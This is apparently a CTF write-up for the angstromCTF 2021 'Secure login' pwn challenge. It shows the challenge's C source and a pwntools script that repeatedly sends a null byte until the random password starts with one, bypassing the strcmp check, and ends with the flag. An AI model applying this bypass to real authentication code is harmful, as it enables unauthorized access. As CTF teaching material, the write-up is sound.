---
layout: post
title: ångstromCTF 2021 - Secure login
categories: [Write-Ups, AngstromCTF]
tags: [AngstromCTF, Pwn]
featured-image:  AngstromCTF/icon.png
featured-image-alt: AngstromCTF
---

It's a write-up about the challenge : [AngstromCTF - Secure shell](https://ctftime.org/task/15319)

	
## 1. Challenge


My login is, potentially, and I don't say this lightly, if you know me you know that's the truth, it's truly, and no this isn't snake oil, this is, no joke, the most secure login service in the world (source).

Try to hack me at /problems/2021/secure_login on the shell server.

Author: kmh

```
#include <stdio.h>

char password[128];

void generate_password() {
	FILE *file = fopen("/dev/urandom","r");
	fgets(password, 128, file);
	fclose(file);
}

void main() {
	puts("Welcome to my ultra secure login service!");

	// no way they can guess my password if it's random!
	generate_password();

	char input[128];
	printf("Enter the password: ");
	fgets(input, 128, stdin);

	if (strcmp(input, password) == 0) {
		char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
	} else {
		puts("Wrong!");
	}
}
```

## 2. Solution

My theory is that strings in C terminate at the newline/ null byte/ terminating character or something. strcmp only compares to the terminating character. There is a chance that the /dev/urandom generates a \x00 as the first character. This denotes that the password would be entirely empty. If I keep sending empty strings, sooner or later, I'll meet into this situation and pass the check.

```
from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './login'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'warn'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Run program 1000 times (hoping for null byte)
for i in range(1000):
    io = start()
    io.recv()
    # Try to login with null byte
    io.sendline(b"\x00")
    io.recvuntil(': ')
    response = io.recv()
    # Did we get the flag?
    if(not b'Wrong!' in response):
        print(response)
    io.close()
```



The flag was : **actf{if_youre_reading_this_ive_been_hacked}**